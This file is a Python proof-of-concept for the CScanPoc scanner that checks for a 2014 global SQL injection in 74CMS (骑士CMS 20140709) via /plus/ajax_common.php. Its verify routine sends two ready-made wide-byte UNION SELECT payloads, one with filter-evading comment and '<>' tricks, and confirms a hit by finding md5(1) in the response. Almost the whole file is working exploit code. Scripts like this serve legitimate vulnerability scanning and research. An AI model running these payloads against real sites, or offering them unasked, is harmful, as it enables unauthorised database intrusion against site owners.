# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = '74CMS_0008'  # 平台漏洞编号，留空
    name = '骑士CMS(20140709)全局注入漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-09-14'  # 漏洞公布时间
    desc = '''
        骑士CMS(20140709) /plus/ajax_common.php 全局注入漏洞。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=070316'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '74CMS(骑士CMS)'  # 漏洞应用名称
    product_version = '20140709'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '23c1516b-28a2-4794-a8dc-1688c9751797'
    author = '国光'  # POC编写者
    create_date = '2018-05-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            url1 = self.target + '/plus/ajax_common.php?act=hotword&query=%E9%8C%A6%27union+/*!50000SeLect*/+1,md5(1),3%23'
            url2 = self.target + '/plus/ajax_common.php?act=hotword&query=%E9%8C%A6%27%20a<>nd%201=2%20un<>ion%20sel<>ect%201,md5(1),3%23'

            code1, head1, res1, errcode1, finalurl1 = hh.http(url1)
            if code1 == 200 and "c4ca4238a0b923820dcc509a6f75849b" in res1:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞;\nSQL注入漏洞地址为{url}'.format(
                        target=self.target, name=self.vuln.name,url=url1))
            code2, head2, res2, errcode2, finalurl2 = hh.http(url2)
            if code2 == 200 and "c4ca4238a0b923820dcc509a6f75849b" in res2:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞;\nSQL注入漏洞地址为{url}'.format(
                    target=self.target, name=self.vuln.name,url=url2))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
